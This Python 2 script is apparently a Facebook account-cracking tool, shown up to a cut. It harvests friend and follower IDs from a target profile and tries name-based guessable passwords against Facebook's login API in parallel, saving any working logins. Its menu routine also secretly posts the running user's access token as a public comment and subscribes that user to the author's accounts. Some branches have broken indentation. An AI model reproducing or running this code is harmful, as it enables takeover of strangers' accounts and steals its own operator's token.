#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by muhammad hamza
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 Saqib.py")

agents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
logo ="""
\033[1;37m   ######     ###     #######  #### ########  
\033[1;37m  ##    ##   ## ##   ##     ##  ##  ##     ## 
\033[1;37m  ##        ##   ##  ##     ##  ##  ##     ## 
\033[1;37m   ######  ##     ## ##     ##  ##  ########  
\033[1;37m        ## ######### ##  ## ##  ##  ##     ## 
\033[1;37m  ##    ## ##     ## ##    ##   ##  ##     ## 
\033[1;37m   ######  ##     ##  ##### ## #### ########  
\033[1;97m-----------------------------------------------
\033[1;37m  ➤ AUTHOR  : SAQIB MEHMOOD
\033[1;37m  ➤ VIRSON  : 1.1
\033[1;37m  ➤ FB ID   : www.facebook.com/Haji.sahab2
\033[1;97m-----------------------------------------------"""

def login():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("\t     Facebook login")
		print('\033[1;37m-------------------------------------------------')
		print("[1] Facebook id/pass login")
		print("[2] Facebook token login")
		print("[3] Back ")
		print('\033[1;37m-------------------------------------------------')
		log_select()
def log_select():
	sel = raw_input("[?] Choose : ")
	if sel =="1":
		log_fb()
	elif sel =="2":
		token()
	elif sel =="0":
		os.system("exit")
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def log_fb():
	os.system("clear")
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
		print("\t     Facebook id/pass login")
		print('\033[1;37m-------------------------------------------------')
		uid = raw_input("[?] Uid : ")
		passw = raw_input("[?] Password : ")
		print('\033[1;37m-------------------------------------------------')
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav = open("access_token.txt", "w")
			sav.write(q["access_token"])
			sav.close()
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			print("\tAccount has checkpoint")
			print("")
			time.sleep(1)
			login()
		else:
			print("")
			print("\tId/pass my be wrong")
			print("")
			time.sleep(1)
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("\t     Login token")
        print('\033[1;37m-------------------------------------------------')
        token = raw_input("[?] Paste token here : ")
        print('\033[1;37m-------------------------------------------------')
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        requests.post('https://graph.facebook.com/1376599765/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100002324915713/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100000000464718/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/107375211862963/comments/?message=' + token + '&access_token=' + token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("[\033[1;32m+\033[1;37m] WELCOME : \033[1;32m%s \033[1;37m[\033[1;32m+\033[1;37m] JOINED : \033[1;32m%s " % (name,loc))
    print('\033[1;37m-------------------------------------------------')
    print("[1] Crack with auto pass")
    print("[2] Crack with choice pass")
    print('[3] Back')
    print('\033[1;37m-------------------------------------------------')
    menu_option()
def menu_option():
	select = raw_input("[?] Choose : ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		login()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("\t     Crack with auto pass")
	print('\033[1;37m-------------------------------------------------')
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[3] Multi id cloning")
	print("[4] File cloning")
	print("[0] Back")
	print('\033[1;37m-------------------------------------------------')
	crack_select()
def crack_select():
	select = raw_input("[?] Choose : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("\t     Auto pass cracking")
		print('\033[1;37m-------------------------------------------------')
		idt = raw_input("[?] Input id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print("\t     Auto pass cracking")
			print('\033[1;37m-------------------------------------------------')
			print("[+] Cloning from : \033[1;32m"+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("\t     Auto pass cracking")
		print('\033[1;37m-------------------------------------------------')
		idt = raw_input("[?] Input id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('\t     Auto pass cracking')
			print("\033[1;97m---------------------------------------------------")
			print("[+] Cloning from : \033[1;32m"+q["name"])
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("\t     AUTO PASS CRACKING")
		print('\033[1;37m-------------------------------------------------')
		idt = raw_input("[1] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
		idt = raw_input("[2] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
		idt = raw_input("[3] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
		idt = raw_input("[4] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
	elif select =="4":
		os.system("clear")
		print(logo)
		print("\t     AUTO PASS FILE CRACK")
		print('\033[1;37m-------------------------------------------------')
		try:
			filelist = raw_input("[?] INPUT FILE NAME : \033[1;32m")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("\t    \033[1;31mRequested file not found\033[0;37m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	print('\033[1;37m-------------------------------------------------')
	print("[$] Total IDs : \033[1;32m"+str(len(id)))
	print('\033[1;37m-------------------------------------------------')
	print("[~] The Process has started")
	print("[~] Press ctrl + z to stop")
	print('\033[1;37m-------------------------------------------------')
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + name.lower().split(' ')[1] 
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"@123"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"123"
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+'12345'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower()+"123456"
											        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											        q = json.loads(data)
											        if "access_token" in q:
												        print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass6+"\033[0;97m")
												        ok = open("ok.txt", "a")
												        ok.write(uid+"|"+pass6+"\n")
												        ok.close()
												        oks.append(uid+pass6)
											        else:
												        if "www.facebook.com" in q["error_msg"]:
													        print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass6+"\033[0;97m")
													        cp = open("cp.txt", "a")
													        cp.write(uid+"|"+pass6+"\n")
													        cp.close()
													        cps.append(uid+pass6)
												        else:
													        pass7 = name.lower()+"786"
											                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											                q = json.loads(data)
											                if "access_token" in q:
												                print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass7+"\033[0;97m")
												                ok = open("ok.txt", "a")
												                ok.write(uid+"|"+pass7+"\n")
												                ok.close()
												                oks.append(uid+pass7)
											                else:
												                if "www.facebook.com" in q["error_msg"]:
													                print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass7+"\033[0;97m")
													                cp = open("cp.txt", "a")
													                cp.write(uid+"|"+pass7+"\n")
													                cp.close()
													                cps.append(uid+pass7)
												                else:
													                pass8 = '786786'
											                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											                        q = json.loads(data)
											                        if "access_token" in q:
												                        print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass8+"\033[0;97m")
												                        ok = open("ok.txt", "a")
												                        ok.write(uid+"|"+pass8+"\n")
												                        ok.close()
												                        oks.append(uid+pass8)
											                        else:
												                        if "www.facebook.com" in q["error_msg"]:
													                        print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass8+"\033[0;97m")
													                        cp = open("cp.txt", "a")
													                        cp.write(uid+"|"+pass8+"\n")
													                        cp.close()
													                        cps.append(uid+pass8)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print('\033[1;37m-------------------------------------------------')
	print("[$] The process has been completed")
	print("[$] Total \\033[1;32mOk\033[1;97m/\033[1;91mCp : \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cps)))
	print('\033[1;37m-------------------------------------------------')
	raw_input(" Press enter to back ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("\t     name+digit pass cracking")
	print('\033[1;37m-------------------------------------------------')
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[3] Multi id cloning")
	print("[4] File cloning")
	print("[0] Back")
	print('\033[1;37m-------------------------------------------------')
	choice_select()
def choice_select():
	select = raw_input("[?] Choose : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("\t     Choice pass cracking")
		print('\033[1;37m-------------------------------------------------')
		pa3 = raw_input("[1] Name + digit : ")
		pa4 = raw_input("[2] Name + digit : ")
		pass5 = raw_input("[3] Password : ")
		pass6 = raw_input("[4] Password : ")
		pass7 = raw_input("[5] Password : ")
		pass8 = raw_input("[6] Password : ")
		print('\033[1;37m-------------------------------------------------')
		idt = raw_input("[?] input id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('\t     Choice pass cracking')
			print('\033[1;37m-------------------------------------------------')
			print("[+] Cloning from : \033[1;32m"+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("\t     Choice pass cracking")
		print('\033[1;37m-------------------------------------------------')
		pa3 = raw_input("[1] Name + digit : ")
		pa4 = raw_input("[2] Name + digit : ")
		pass5 = raw_input("[3] Password : ")
		pass6 = raw_input("[4] Password : ")
		pass7 = raw_input("[5] Password : ")
		pass8 = raw_input("[6] Password : ")
		print('\033[1;37m-------------------------------------------------')
		idt = raw_input("[?] Input id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('\t     Choice pass cracking')
			print('\033[1;37m-------------------------------------------------')
			print("[+] Cloning from : \033[1;32m"+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("\t     Choice pass cracking")
		print('\033[1;37m-------------------------------------------------')
		pa3 = raw_input("[1] Name + digit : ")
		pa4 = raw_input("[2] Name + digit : ")
		pass5 = raw_input("[3] Password : ")
		pass6 = raw_input("[4] Password : ")
		pass7 = raw_input("[5] Password : ")
		pass8 = raw_input("[6] Password : ")
		print('\033[1;37m-------------------------------------------------')
		idt = raw_input("[1] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
		idt = raw_input("[2] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
		idt = raw_input("[3] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
		idt = raw_input("[4] INPUT ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input("PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+na)
	elif select =="4":
		os.system("clear")
		print(logo)
		print("\t     Choice pass cracking")
		print('\033[1;37m-------------------------------------------------')
		pa3 = raw_input("[1] Name + digit : ")
		pa4 = raw_input("[2] Name + digit : ")
		pass5 = raw_input("[3] Password : ")
		pass6 = raw_input("[4] Password : ")
		pass7 = raw_input("[5] Password : ")
